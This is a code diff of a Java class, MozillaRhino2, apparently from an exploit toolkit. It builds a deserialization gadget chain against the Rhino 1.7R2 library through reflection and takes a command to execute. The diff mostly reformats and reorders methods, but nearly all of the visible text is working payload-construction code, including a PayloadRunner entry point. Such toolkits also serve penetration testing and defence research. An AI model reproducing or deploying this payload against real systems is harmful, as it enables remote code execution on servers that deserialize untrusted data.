@@ -48,10 +48,20 @@ import java.util.Map;
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"rhino:js:1.7R2"})
-@Authors({ Authors.TINT0 })
+@Authors({Authors.TINT0})
 public class MozillaRhino2 implements ObjectPayload<Object> {
 
-    public Object getObject( String command) throws Exception {
+    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
+        out.writeObject("java.lang.Object");
+        out.writeObject(new String[0]);
+        out.writeObject(javaObject);
+    }
+
+    public static void main(final String[] args) throws Exception {
+        PayloadRunner.run(MozillaRhino2.class, args);
+    }
+
+    public Object getObject(String command) throws Exception {
         ScriptableObject dummyScope = new Environment();
         Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
@@ -59,9 +69,9 @@ public class MozillaRhino2 implements ObjectPayload<Object> {
 
         Object initContextMemberBox = Reflections.createWithConstructor(
             Class.forName("org.mozilla.javascript.MemberBox"),
-            (Class<Object>)Class.forName("org.mozilla.javascript.MemberBox"),
-            new Class[] {Method.class},
-            new Object[] {Context.class.getMethod("enter")});
+            (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"),
+            new Class[]{Method.class},
+            new Object[]{Context.class.getMethod("enter")});
 
         ScriptableObject initContextScriptableObject = new Environment();
         Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
@@ -94,16 +104,6 @@ public class MozillaRhino2 implements ObjectPayload<Object> {
         Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);
 
         return nativeJavaObject;
-    }
-
-    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
-        out.writeObject("java.lang.Object");
-        out.writeObject(new String[0]);
-        out.writeObject(javaObject);
-    }
-
-    public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(MozillaRhino2.class, args);
     }
 
 }
